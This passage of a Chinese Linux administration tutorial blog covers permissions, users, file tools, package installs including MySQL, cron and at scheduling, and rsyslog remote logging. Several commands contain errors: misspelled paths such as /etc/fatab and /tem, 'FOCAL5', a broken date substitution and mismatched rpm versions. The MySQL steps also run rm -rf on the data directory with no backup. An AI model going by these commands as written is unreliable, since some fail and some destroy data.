class="hljs-string">#net.netfilter.nf_conntrack_max=655350</span><span class="hljs-string">#net.netfilter.nf_conntrack_tcp_timeout_established=1200</span><span class="hljs-string"># 确保无人能修改路由表</span><span class="hljs-string">#net.ipv4.conf.all.accept_redirects = 0</span><span class="hljs-string">#net.ipv4.conf.default.accept_redirects = 0</span><span class="hljs-string">#net.ipv4.conf.all.secure_redirects = 0</span><span class="hljs-string">#net.ipv4.conf.default.secure_redirects = 0</span><span class="hljs-string">EOF</span>/sbin/sysctl -p</code></pre><hr><h3 id="8-安装常用软件"><a href="#8-安装常用软件" class="headerlink" title="8.安装常用软件"></a>8.安装常用软件</h3><pre><code class="hljs bash">yum install lrzsz ntpdate sysstat net-tools wget vim bash-completion dos2unix -y</code></pre><hr><h3 id="9-更新系统到最新"><a href="#9-更新系统到最新" class="headerlink" title="9.更新系统到最新"></a>9.更新系统到最新</h3><pre><code class="hljs bash"><span class="hljs-comment"># 更新补丁并升级系统版本</span>yum update  -y<span class="hljs-comment"># 只更新安全补丁，不升级系统版本</span>yum --security check-update    <span class="hljs-comment">#检查是否有安全补丁</span></code></pre><h3 id="10-电脑不休眠"><a href="#10-电脑不休眠" class="headerlink" title="10.电脑不休眠"></a>10.电脑不休眠</h3><pre><code class="hljs bash">vim  /etc/systemd/logind.conf<span class="hljs-comment"># 修改为仅锁屏</span>HandleLidSwitch=lock<span class="hljs-comment"># 必须要使用如下命令才能使上面的配置生效</span>systemctl restart systemd-logind</code></pre><hr><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="Linux-中的权限、用户和组"><a href="#Linux-中的权限、用户和组" class="headerlink" title="Linux 中的权限、用户和组"></a>Linux 中的权限、用户和组</h2><h3 id="1-修改权限"><a href="#1-修改权限" class="headerlink" title="1.修改权限"></a>1.修改权限</h3><ol><li>字母修改权限</li></ol><blockquote><p>关键字有：[u, g, o, a][+, -][r, w, x]</p></blockquote><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> a+w filename.txt</code></pre><ol><li>数字修改权限</li></ol><blockquote><p>(r&#x3D;0, w&#x3D;1, x&#x3D;0) &#x3D;&gt; (010&#x3D;2)</p></blockquote><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 222 filename.txt</code></pre><hr><h3 id="2-修改用户和组"><a href="#2-修改用户和组" class="headerlink" title="2.修改用户和组"></a>2.修改用户和组</h3><ol><li>修改所属用户：chown [-R] 目标用户 文件或文件夹</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">chown</span> username filename.txt</code></pre><ol><li>修改所属组：chown [-R] 目标组 文件或文件夹</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">chgrp</span> groupname filename.txt</code></pre><ol><li>同时修改所属用户和组：chown [-R] 目标用户 目标组 文件或文件夹</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">chown</span> username:groupname filename.txt<span class="hljs-comment"># 递归修改，目录包含的子文件或目录也修改</span><span class="hljs-built_in">chown</span> -R username:groupname filename.txt</code></pre><hr><h3 id="3-目录说明"><a href="#3-目录说明" class="headerlink" title="3.目录说明"></a>3.目录说明</h3><p>bin:可执行命令文件<br>boot:启动文件<br>dev:设备文件<br>etc:配置文件<br>home:用户的目录（每个用户在其下有一个用户的文件夹）<br>lib:库文件<br>media:设备挂载点文件（U 盘）<br>mnt:手动设备挂载点<br>opt:大型软件安装包（源码安装包）<br>usr:软件安装包（类似 Windows 中的 Programfiles）</p><hr><h3 id="4-PATH-运行变量"><a href="#4-PATH-运行变量" class="headerlink" title="4.PATH 运行变量"></a>4.PATH 运行变量</h3><ol><li>查看运行变量：echo $PATH</li><li>修改 PATH：PATH&#x3D;$PATH”:&#x2F;home&#x2F;test&#x2F;testDir”, testDir 下的运行文件就可以在系统的任何地方都可以运行。</li></ol><hr><h3 id="5-文件内容查阅"><a href="#5-文件内容查阅" class="headerlink" title="5.文件内容查阅"></a>5.文件内容查阅</h3><ol><li>cat: 由第一行开始显示文件内容</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> filename</code></pre><ol><li>tac: 从最后一行开始显示，可以看出 tac 是 cat 的倒置显示</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">tac</span> filename</code></pre><ol><li>nl: 显示的时候，顺道输出行号！</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">nl</span> filename<span class="hljs-comment"># 等同于</span><span class="hljs-built_in">cat</span> -n filename</code></pre><ol><li>more: 一页一页的显示文件内容。空格下一页，q 退出。</li></ol><pre><code class="hljs bash">more filename</code></pre><ol><li>less: 与 more 类似，但是比 more 更好的是，他可以通过方向键往前翻页！</li></ol><pre><code class="hljs bash">less filename</code></pre><ol><li>head: 只看头几行</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">head</span> filename<span class="hljs-built_in">head</span> -3 filename</code></pre><ol><li>tail: 只看尾巴几行</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> filename<span class="hljs-comment"># 查看日志是，只查看后几行并实时更新</span><span class="hljs-built_in">tail</span> -f filename.log</code></pre><ol><li>od: 以二进位的方式读取文件内容（string）</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">od</span> binfilenamestring binfilename</code></pre><hr><h3 id="6-档案和目录的默认权限与隐藏权限"><a href="#6-档案和目录的默认权限与隐藏权限" class="headerlink" title="6.档案和目录的默认权限与隐藏权限"></a>6.档案和目录的默认权限与隐藏权限</h3><ol><li>文件默认权限：umask,使用默认权限进行过来</li></ol><p>默认文件权限 666: 110 110 110<br>umask 值为 0 022: 000 010 010<br>默认文件权限 &amp; umask 值 &#x3D; 过滤后的权限<br>过滤文件权限 644: 110 100 100<br>一开始是文件权限(755);默认创建文件夹的权限(644)<br>默认创建文件的权限(666);默认创建文件夹的权限(777)</p><pre><code class="hljs bash"><span class="hljs-built_in">umask</span><span class="hljs-comment">#0022 # 默认0(标志) 0(谁都不过滤) 2(过滤组的w权限) 2(过滤其他用户的w权限)</span><span class="hljs-built_in">umask</span> 000 <span class="hljs-comment"># 修改 umask 值</span><span class="hljs-built_in">umask</span> -S<span class="hljs-comment">#u=rwx,g=r,o=r # umask的理解，umask -S 的命令</span></code></pre><ol><li>文件隐藏权限</li></ol><p>文件的 i 权限(不能修改)和 a 权限(只能添加)<br>修改隐藏权限: chattr [+-] [attr] 文件或文件夹</p><pre><code class="hljs bash">chattr +a <span class="hljs-built_in">dir</span> <span class="hljs-comment"># dir目录下只能添加文件，不能删除文件</span>chattr +i <span class="hljs-built_in">dir</span> <span class="hljs-comment"># dir目录下不能操作文件</span></code></pre><hr><h3 id="7-文件类型查看"><a href="#7-文件类型查看" class="headerlink" title="7.文件类型查看"></a>7.文件类型查看</h3><ol><li>file 命令</li></ol><pre><code class="hljs bash">file /bin/touchfile /usr/bin/passwdfile /var/lib/mlocate/mlocate.db</code></pre><hr><h3 id="8-用户相关命令："><a href="#8-用户相关命令：" class="headerlink" title="8.用户相关命令："></a>8.用户相关命令：</h3><pre><code class="hljs bash"><span class="hljs-built_in">id</span><span class="hljs-comment"># 显示当前用户信息</span>passwd<span class="hljs-comment"># 修改当前用户的密码</span><span class="hljs-built_in">groups</span><span class="hljs-comment"># 查看所属组</span><span class="hljs-comment">#添加用户：useradd [options] username</span><span class="hljs-comment">#选项：-g主组 指定用户所属的用户组</span><span class="hljs-comment">#-G附属组指定用户所属的附加组</span><span class="hljs-comment">#-r等效于--system 表示创建一个系统账号</span><span class="hljs-comment">#注：默认不会为系统用户创建对应的主目录</span><span class="hljs-comment">#锁定或解锁用户：passwd [options] [username]</span><span class="hljs-comment">#如果只提供用户名，则修改当前用户的密码</span><span class="hljs-comment">#选项：-l锁定用户</span><span class="hljs-comment">#-u解锁用户</span><span class="hljs-comment">#-d设置用户无密码，用户下次登陆时系统不再询问密码。</span><span class="hljs-comment">#非root用户临时使用root权限：sudo</span><span class="hljs-comment">#注：有时需要修改 vim /etc/sudoers, 把用户添加进去才可以</span></code></pre><hr><h3 id="9-组相关命令"><a href="#9-组相关命令" class="headerlink" title="9.组相关命令"></a>9.组相关命令</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1.添加组：groupadd groupname</span>groupadd javadevgroup<span class="hljs-comment"># 2.删除组：groupdel [options] groupname</span>groupdel javadevgroup<span class="hljs-comment"># 注：-r 同时删除该用户的主目录</span><span class="hljs-comment"># 3.修改用户所属组：usermod [options] username</span>usermod -G javadevgroup hjx<span class="hljs-comment"># 注：-g 主组-G 附属组</span></code></pre><hr><h3 id="10-指令与档案的搜寻"><a href="#10-指令与档案的搜寻" class="headerlink" title="10.指令与档案的搜寻"></a>10.指令与档案的搜寻</h3><ol><li>查找指令：which 命令</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 查找文件：find [查找位置] [查找参数]</span><span class="hljs-comment"># 示例：find . -name &quot;s*&quot; 按文件名查找，可使用通配符</span><span class="hljs-comment"># 选项：</span><span class="hljs-comment">#-name 查找文件/文件夹名称</span><span class="hljs-comment">#-iname 忽略大小写的名称查找</span><span class="hljs-comment">#-user    查找所属用户的文件</span><span class="hljs-comment">#-group 查找所属组的文件</span><span class="hljs-comment">#-or 或条件</span><span class="hljs-built_in">which</span> <span class="hljs-built_in">ls</span></code></pre><ol><li>查找内容：grep（全称 Global Regular Expression Pring）</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># grep [option] pattern file</span><span class="hljs-comment"># 基于正则表达式搜索文本，并吧匹配的行显示出来。如果正则表达式中包括空格，则必须使# 用引号将正则表达式引起来。</span><span class="hljs-comment"># 选项:-n    #显示行号</span><span class="hljs-comment">#-i        #忽略大小写</span><span class="hljs-comment">#-w       # 单词完整匹配</span>grep <span class="hljs-string">&#x27;linux&#x27;</span> test.txt <span class="hljs-comment">#从文件中查找关键词</span>grep ^u test.txt <span class="hljs-comment"># 找出以u开头的行</span>grep hat$   test.txt <span class="hljs-comment"># 找出以hat结尾的行</span></code></pre><hr><h3 id="11-Linux-常见的压缩与打包指令"><a href="#11-Linux-常见的压缩与打包指令" class="headerlink" title="11.Linux 常见的压缩与打包指令"></a>11.Linux 常见的压缩与打包指令</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1. zip压缩（归档）：</span><span class="hljs-comment">#zip [目标压缩文件名] [源文件名]</span>zip test1to3 test1.txt test2.txt test3.txt<span class="hljs-comment">#unzip [压缩文件名]</span>unzip testto3.zip<span class="hljs-comment"># 2. gzip压缩 (压缩)：</span><span class="hljs-comment">#gzip [file-list] # 压缩后会删除原始文件，压缩后的文件后缀为.gz</span>gzip file1 file2<span class="hljs-comment">#gzip -d [zip-file-list] # 解压缩文件</span>gzip -d file.gz<span class="hljs-comment"># 3. tar (归档)</span>tar -cvf filename.tar ./dir1 <span class="hljs-comment"># 将dir1目录归档</span>tar -xvf filename.tar <span class="hljs-comment"># 解压</span>tar -cvzf filename.tar.gz ./dir1 <span class="hljs-comment">#归档的同时使用gzip压缩</span>tar -xvzf filename.tar.gz <span class="hljs-comment"># 解压</span></code></pre><hr><h3 id="12-Linux-安装软件的方式"><a href="#12-Linux-安装软件的方式" class="headerlink" title="12.Linux 安装软件的方式"></a>12.Linux 安装软件的方式</h3><pre><code class="hljs bash"><span class="hljs-comment"># 二进制文件的安装，常用于归档的编译好的文件压缩包。（XXX.tar 或者 XXX.tar.gz）</span><span class="hljs-comment"># 1. rmp文件安装</span>rpm(Red-Hat Package Manager)红帽的一种安装包方式rpm -qa | grep [keywords] <span class="hljs-comment"># 查询是否已经安装某个应用程序</span>rpm -ivh software.rpm <span class="hljs-comment"># 安装软件 -v显示纤细安装信息， -h 显示进度</span>rpm -e --nodeps software.rpm <span class="hljs-comment"># 卸载软件 --nodeps表示不检查依赖关系，强制卸载</span><span class="hljs-comment"># 2. yum安装：</span><span class="hljs-comment"># 是一个rpm的前端程序，使用在线仓库来检索和安装RPM软件包，能够自动解决RPM的依赖关系。</span><span class="hljs-comment"># yum list installed | grep [keywords] # 查看是否已经安装某个应用程序</span>yum search keywords <span class="hljs-comment"># 从仓库中查找软件包</span>yum install software-name <span class="hljs-comment"># 安装软件包</span>yum remove software-name <span class="hljs-comment"># 卸载软件包</span></code></pre><hr><h3 id="13-安装-JDK8-和-Tomcat8"><a href="#13-安装-JDK8-和-Tomcat8" class="headerlink" title="13.安装 JDK8 和 Tomcat8"></a>13.安装 JDK8 和 Tomcat8</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1.安装JDK8</span><span class="hljs-comment"># 上传文件到 /opt 下，并解压，修改解压文件名称为 jkd8，</span><span class="hljs-comment"># 再到/etc/profile中添加环境变量PATH</span><span class="hljs-built_in">export</span> PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROLJAVA_HOME=<span class="hljs-string">&quot;/opt/jdk8&quot;</span>PATH=<span class="hljs-variable">$JAVA_HOME</span><span class="hljs-string">&quot;/bin:&quot;</span><span class="hljs-variable">$PATH</span><span class="hljs-comment"># 2.安装Tomcat8，跟JDK8类似</span><span class="hljs-built_in">cd</span> /etc/sysconfig/network-scripts<span class="hljs-comment"># 网卡配置</span>DEVICE=eth0HWADDR=00:0C:29:6D:73:FATYPE=EthernetUUID=ee3f1297-cff6-416d-9bb4-a95939413426ONBOOT=<span class="hljs-built_in">yes</span>NM_CONTROLLED=<span class="hljs-built_in">yes</span>BOOTPROTO=dhcp<span class="hljs-comment"># 改为</span>ONBOOT=<span class="hljs-string">&quot;yes&quot;</span>IPADDR=192.168.18.125GATEWAY=192.168.18.1NETMASK=255.255.255.0DNS1=180.76.76.76DNS2=114.114.114.114</code></pre><hr><h3 id="14-安装-MySQL8"><a href="#14-安装-MySQL8" class="headerlink" title="14.安装 MySQL8"></a>14.安装 MySQL8</h3><pre><code class="hljs bash">rpm -qa | grep mysql <span class="hljs-comment"># 查看老版本mysql</span>rpm -e --nodeps mysqll-XXXX（一个一个）# 删除老版本mysql<span class="hljs-built_in">rm</span> -rf /usr/share/mysql <span class="hljs-comment"># 删除mysql的文件</span><span class="hljs-built_in">rm</span> -rf /var/lib/mysql <span class="hljs-comment"># 删除mysql文件</span><span class="hljs-comment"># 下载并解压在/opt/mysql文件下</span>tar -xvf mysql-8.0.20-1.el7.x86_64.rpm-bundle.tar<span class="hljs-comment"># 顺序安装MySql</span>rpm -ivh mysql-community-common-8.0.20-1.el7.x86_64.rpmrpm -ivh mysql-community-libs-8.0.20-1.el7.x86_64.rpm --force --nodepsrpm -ivh mysql-community-client-8.0.20-1.el7.x86_64.rpm --force --nodepsrpm -ivh mysql-community-server-8.0.20-1.el7.x86_64.rpm --force --nodepsrpm -ivh mysql-community-devel-8.0.20-1.el7.x86_64.rpm --force --nodeps<span class="hljs-comment"># Yum安装</span>wget -i -c https://dev.mysql.com/get/mysql80-community-release-el6-3.noarch.rpmyum -y install mysql80-community-release-el7-3.noarch.rpmyum -y install mysql-community-serverservice mysqld start <span class="hljs-comment"># 启动服务</span><span class="hljs-comment"># root用户的初始密码在/var/log/mysqld.log文件中，查看密码：</span>grep <span class="hljs-string">&#x27;temporary password&#x27;</span> /var/log/mysqld.log<span class="hljs-comment"># 重置mysql密码</span>mysql&gt; alter user <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> identified by <span class="hljs-string">&#x27;password&#x27;</span>;<span class="hljs-comment"># 重启mysql服务</span>service mysqld stopservice mysqld start</code></pre><h1 id="自动化运维"><a href="#自动化运维" class="headerlink" title="自动化运维"></a>自动化运维</h1><h2 id="运维基础"><a href="#运维基础" class="headerlink" title="运维基础"></a>运维基础</h2><h3 id="1-at-简介"><a href="#1-at-简介" class="headerlink" title="1.at 简介"></a>1.at 简介</h3><blockquote><ol><li>at 一次性计划任务只执行一次，一般用于满足临时的任务需求</li><li>主要是时间点比较灵活</li><li>前提:系统开启 atd 服务</li></ol></blockquote><pre><code class="hljs shell">yum install at<span class="hljs-meta prompt_"># </span><span class="language-bash">开启服务</span>systemctl start atd.service<span class="hljs-meta prompt_"># </span><span class="language-bash">开机自启动</span>systemctl enable atd.service<span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前的</span>systemctl status atdlanguage-shell复制代码</code></pre><h3 id="2-at-简单使用"><a href="#2-at-简单使用" class="headerlink" title="2.at 简单使用"></a>2.at 简单使用</h3><p>定义定时任务 1</p><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">设置当前用户的一次性任务命令</span>at 23:30<span class="hljs-meta prompt_"># </span><span class="language-bash">定义定时任务要执行的命令</span>systemctl restart httpdlanguage-shell复制代码</code></pre><blockquote><p><code>注意:</code> 一次性的计划任务使用 ctr+D 来结束提交</p></blockquote><p>定义定时任务 2</p><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;systemctl restart httpd&quot;</span> | at 23:30</code></pre><p>查看定时任务</p><pre><code class="hljs shell">at -llanguage-shell复制代码</code></pre><p>删除编号为 2 的定时任务</p><pre><code class="hljs shell">atrm 2language-shell复制代码</code></pre><blockquote><p>使用帮助： <code>at --help</code> 或者 <code>man at</code></p></blockquote><hr><h3 id="3-cron-简介"><a href="#3-cron-简介" class="headerlink" title="3.cron 简介"></a>3.cron 简介</h3><ol><li>简介</li></ol><blockquote><ol><li>能够周期性地、有规律地执行某些具体的任务</li><li>Linux 系统中默认启用的 crond 服务</li><li>参数格式</li></ol></blockquote><p><img src="https://hjxstart.github.io/images/2021/06/09/02e49f81-65f9-451b-8aa6-6794e740882d.png" alt="image.png"></p><p>image.png</p><ol><li>crontab 命令书写格式中符号的含义</li></ol><blockquote><ol><li><code>*</code> 代表每</li><li><code>,</code> 来分别表示多个时间段，例如“8,9,12”表示 8 月、9 月和 12 月</li><li><code>-</code> 来表示一段连续的时间周期(例如字段“日”的取值为“12-15”，则表示每月的 12~15 日)</li><li><code>/</code> 表示执行任务的间隔时间(例如“*&#x2F;2”表示每隔 2 分钟执行一次任务)</li></ol></blockquote><p>示例</p><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">注释格式<span class="hljs-built_in">who</span>,when,why?</span><span class="hljs-meta prompt_"># </span><span class="language-bash">每周1，周3，周五的3:25分</span>25 3 * * 1,3,5 command<span class="hljs-meta prompt_"># </span><span class="language-bash">每周工作日(周一至周五)1:00</span>0 1 * * 1-5 command<span class="hljs-meta prompt_"># </span><span class="language-bash">每隔5分钟</span>*/5 * * * * command<span class="hljs-meta prompt_"># </span><span class="language-bash">在上午8点到11点的第3和 第15分钟执行</span>3,15 8-11 * * *<span class="hljs-meta prompt_"># </span><span class="language-bash">每隔两天的上午8点到11点的第3 和第15分钟执行</span>3,15 8-11 */2 * *language-shell复制代码</code></pre><blockquote><ol><li><code>注意1</code>：如果时上有值，分钟必须有值</li><li><code>注意2</code>：定时任务中%无法执行，需要转义%</li></ol></blockquote><hr><h3 id="4-系统级的计划任务"><a href="#4-系统级的计划任务" class="headerlink" title="4.系统级的计划任务"></a>4.系统级的计划任务</h3><ol><li>简述</li></ol><blockquote><ol><li>系统设置好的，一般了解就行了，不要更改配置文件是&#x2F;etc&#x2F;crontab</li></ol></blockquote><ol><li>文件&#x2F;etc&#x2F;crontab</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">For details see man 4 crontabs</span><span class="hljs-meta prompt_"># </span><span class="language-bash">Example of job definition:</span><span class="hljs-meta prompt_"># </span><span class="language-bash">.---------------- minute (0 - 59)</span><span class="hljs-meta prompt_"># </span><span class="language-bash">| .------------- hour (0 - 23)</span><span class="hljs-meta prompt_"># </span><span class="language-bash">| | .---------- day of month (1 - 31)</span><span class="hljs-meta prompt_"># </span><span class="language-bash">| | | .------- month (1 - 12) OR jan,feb,mar,apr ...</span><span class="hljs-meta prompt_"># </span><span class="language-bash">| | | | .----dayofweek(0-6)(Sunday=0or7)OR sun,mon,tue,wed,thu,fri,sat</span><span class="hljs-meta prompt_"># </span><span class="language-bash">| | | | |</span><span class="hljs-meta prompt_"># </span><span class="language-bash">* * * * * user-name <span class="hljs-built_in">command</span> to be executed</span>language-shell复制代码</code></pre><hr><h3 id="5-用户级的计划任务"><a href="#5-用户级的计划任务" class="headerlink" title="5.用户级的计划任务"></a>5.用户级的计划任务</h3><ol><li>crontab 常用选项</li></ol><ul><li>-e: 编辑计划任务 edit</li><li>-l: 查看计划任务 display</li><li>-u: 指定用户 user</li><li>-r: 删除计划任务 remove</li></ul><ol><li>示例</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 每月1、10、22日的4:45重启network服务</span>45 4 1,10,22 * * systemctl restart network45 4 1,10,22 * * /usr/bin/systemctl restart network<span class="hljs-comment"># 每周六、周日的1:10重启network服务</span>10 1 * * 6-7 sytemctl restart network<span class="hljs-comment"># 每天18:00至23:00之间每隔30分钟重启network服务</span>*/30 18-23 * * * systemctl restart network<span class="hljs-comment"># 每隔两天的上午8点到11点的第3和第15分钟执行一次重启</span>3,15 8-11 */2 * * systemctl reboot<span class="hljs-comment"># 每周日凌晨2点30分，运行cp命令对/etc/fstab文件进行备份，存储位置为/backup/fstab-YYYY-MM-DD-hh-mm-ss;</span><span class="hljs-comment"># date +%F-%H-%M-%S &gt; 2021-06-09-09-35-38</span>30 2 * * 7 <span class="hljs-built_in">cp</span> /etc/fatab /backup/fstab-date +\%F-\%H-\%M-\%S30 2 * * 0 <span class="hljs-built_in">cp</span> /etc/fatab /backup/fstab-date +\%F-\%H-\%M-\%S<span class="hljs-comment"># 晚上11点到早上7点之间，每隔一小时重启smb</span>0 23,0-7/1 * * * systemctl restart smb</code></pre><blockquote><ol><li><code>注意1：</code>vim &#x2F;etc&#x2F;crontab (系统级) 与 crontab -e (用户自定义)写入的定时运行的区别</li><li><code>注意2：</code>用户自定义的定时任务文件路径：&#x2F;var&#x2F;spool&#x2F;cron&#x2F;username</li></ol></blockquote><ol><li>再玩一次</li></ol><blockquote><ol><li>设置一次性计划任务在 18:00 时关闭系统，并查看任务 信息。</li><li>每周日凌晨 2 点 30 分，运行 cp 命令对&#x2F;etc&#x2F;fstab 文件进行 备份，存储位置为&#x2F;backup&#x2F;fstab-YYYY-MM-DD-hh-mm- ss。</li><li>每周 2、4、7 备份&#x2F;var&#x2F;log&#x2F;secure 文件至&#x2F;logs 目录中， 文件名格式为“secure-yyyymmdd”。</li><li>每两小时取出当前系统&#x2F;proc&#x2F;meminfo 文件中以 S 或 M 开 头的行信息追加至&#x2F;tmp&#x2F;meminfo.txt 文件中。</li></ol></blockquote><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1.设置一次性计划任务在18:00时关闭系统，并查看任务 信息。</span>at 18:00systemctl poweroffat -l<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">2.每周日凌晨2点30分，运行<span class="hljs-built_in">cp</span>命令对/etc/fstab文件进行 备份，存储位置为/backup/fstab-YYYY-MM-DD-hh-mm-ss。</span>30 2 * * 7 cp /etc/fstab /backup/fstab-$(date +\%F-\%H-\%M-\%S)<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">3.每周2、4、7备份/var/log/secure文件至/logs目录中， 文件名格式为“secure-yyyymmdd”。</span>0 0 * * 2,4,7 cp /var/log/secure /logs/secure-$(date + \%Y\%m\%d)<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">4.每两小时取出当前系统/proc/meminfo文件中以S或M开 头的行信息追加至/tmp/meminfo.txt文件中。</span>0 */2 * * * grep ^[SM] /proc/meminfo  &gt;&gt; /tem/meminfo.txtlanguage-shell复制代码</code></pre><hr><h3 id="6-rsyslog-日志管理"><a href="#6-rsyslog-日志管理" class="headerlink" title="6.rsyslog 日志管理"></a>6.rsyslog 日志管理</h3><ol><li>简介</li></ol><blockquote><ol><li>Centos6.x 日志服务已经由 rsyslogd 取代了原先的 syslogd 服务,有如下优点</li><li>基于 TCP 网络协议传输日志信息;</li><li>更安全的网络传输方式;</li><li>有日志消息的及时分析框架;</li><li>后台数据库;</li><li>配置文件中可以写简单的逻辑判断; ü 与 syslog 配置文件相兼容。</li></ol></blockquote><ol><li>系统中常见的日志文件</li></ol><blockquote><ol><li><code>/var/log/message</code> 系统重要的日志</li><li><code>/var/log/cron</code> 定时任务的日志</li><li><code>/var/log/dmesg</code> 开机时内核自检的信息</li><li><code>lastb /var/log/btmp</code> 错误登录的日志</li><li><code>last /var/log/wtmp</code>所有用户登录和注销信息</li><li><code>/var/run/utmp</code>记录当前已经登录的用户信息，要使用 w,who,users 等命令查询</li><li><code>/var/log/secure</code>记录验证和授权方面的信息</li></ol></blockquote><ol><li>日志格式。</li></ol><blockquote><ol><li>只要是由日志服务 rsyslogd 记录的日志文件，他们的格式是一样的。基本日志格式包含以下四列:</li><li><code>事件产生的时间</code>,;<code>发生事件的服务器的主机名</code>;<code>产生事件的服务名或程序名</code>;<code>事件的具体信息。</code></li></ol></blockquote><pre><code class="hljs shell">tail -2 /var/log/messagesJun  9 10:11:03 localhost dbus[6555]: [system] Activating service name=&#x27;org.freedesktop.problems&#x27; (using servicehelper)Jun  9 10:11:03 localhost dbus[6555]: [system] Successfully activated service &#x27;org.freedesktop.problems&#x27;language-shell复制代码</code></pre><ol><li>&#x2F;etc&#x2F;rsyslog.conf 配置文件格式</li></ol><blockquote><ol><li>服务名：*, authpriv, cron, ftp, daemon(守护进程), kern, mall, syslog, user</li><li>连接符号：<code>.</code>(大于), <code>.=</code>(等于),<code>.!</code>(不等于)</li><li>日志级别: null, debug, info, notice, warning, err(错误), crit(临界状态), alert(警告), emerg(疼痛，宕机)</li><li>日志记录位置：文件，远程主机(tcp@@IP:514, udp@IP)需要在线，并用户对等传输(root-&gt;root)</li></ol></blockquote><pre><code class="hljs shell">服务名称[连接符号]日志等级 日志记录位置authpriv.* /var/log/secure认证相关服务.所有日志等级 记录在/var/log/secure 日志中language-shell复制代码</code></pre><ol><li>日志服务 rsyslogd</li></ol><p>存放日志的服务器（开启接受功能）:192.168.17.130</p><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">编辑配置文件</span>vim /etc/rsyslog.conflanguage-shell复制代码<span class="hljs-meta prompt_"># </span><span class="language-bash">Provides UDP syslog reception 开启UDP传输</span><span class="hljs-meta prompt_">$</span><span class="language-bash">ModLoad imudp</span><span class="hljs-meta prompt_">$</span><span class="language-bash">UDPServerRun 514</span><span class="hljs-meta prompt_"># </span><span class="language-bash">Provides TCP syslog reception 开启TCP传输</span><span class="hljs-meta prompt_">$</span><span class="language-bash">ModLoad imtcp</span><span class="hljs-meta prompt_">$</span><span class="language-bash">InputTCPServerRun 514</span>language-shell复制代码<span class="hljs-meta prompt_"># </span><span class="language-bash">重启服务</span>systemctl restart rsyslog<span class="hljs-meta prompt_"># </span><span class="language-bash">查看514端口是否在监听</span>netstat -tnlup | grep :514<span class="hljs-meta prompt_"># </span><span class="language-bash">实时查看日志后，进行测试</span>tail /var/log/maillog -flanguage-shell复制代码</code></pre><p>产生日志服务器（发送日志）:192.168.17.133</p><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">默认端口为514</span>echo &#x27;mail.info @192.168.17.130:514&#x27;&gt;&gt; /etc/rsyslog.conf<span class="hljs-meta prompt_"># </span><span class="language-bash">测试</span>[root@localhost ~]# systemctl restart rsyslog # 重启服务<span class="hljs-meta prompt_"># </span><span class="language-bash">发送测试消息</span>[root@localhost ~]# logger -p mail.info &quot;this is a test for rmote log.&quot;language-shell复制代码</code></pre><ol><li>作业</li></ol><p>扩展：集中日志管理工具 elk, 有收集，分析，展示日志功能，并支持分布式</p><pre><code class="hljs shell">1.将authpriv设备日志记录到 /var/log/auth.log1).修改日志文件位置<span class="hljs-meta prompt_"># </span><span class="language-bash">vim /etc/rsyslog.conf</span><span class="hljs-meta prompt_">#</span><span class="language-bash">authpriv.* /var/log/secure</span>authpriv.* /var/log/auth.log2).重启程序，触发日志生成<span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl restart rsyslog.service</span><span class="hljs-meta prompt_"># </span><span class="language-bash">ll /var/log/auth.log</span>2.改变应用程序sshd的日志设备为local5,并定义lcoal5设备日志记录到/var/log/local5.local。1).设置ssh程序的日志设备为自定义设备。<span class="hljs-meta prompt_"># </span><span class="language-bash">vim /etc/ssh/sshd_config</span><span class="hljs-meta prompt_">#</span><span class="language-bash">SyslogFacility AUTHPRIV</span>SyslogFacility FOCAL52).设置自定义设备日志文件存放位置。<span class="hljs-meta prompt_"># </span><span class="language-bash">vim /etc/rsyslog.conf</span>local5.* /var/log/local5.local3).重启失效<span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl restart ssh // 重启sshd程序</span><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl restart rsyslog // 重启日志</span>4).尝试登录，触发日志。5).观察日志。理解自定义日志设备。3.使用logger程序写日志到指定的设备及级别。服务器1(192.168.17.133)发送日志<span class="hljs-meta prompt_"># </span><span class="language-bash">vim /etc/ssh/sshd_config</span><span class="hljs-meta prompt_">#</span><span class="language-bash">SyslogFacility AUTHPRIV // 将原来配置注释</span>SyslogFacility LOCAL5 // 自定义接受设备 local5<span class="hljs-meta prompt_"># </span><span class="language-bash">vim /etc/rsyslog.conf // 此文件来管理日志</span>local5.* @192.168.17.130:514 // 此处填写日志服务器的IP地址<span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl restart sshd // 重启sshd程序</span><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl restart rsyslog // 重启日志</span>服务器2(192.168.17.130)接受日志<span class="hljs-meta prompt_"># </span><span class="language-bash">vim /etc/rsyslog.conf</span><span class="hljs-meta prompt_">$</span><span class="language-bash">ModLoad 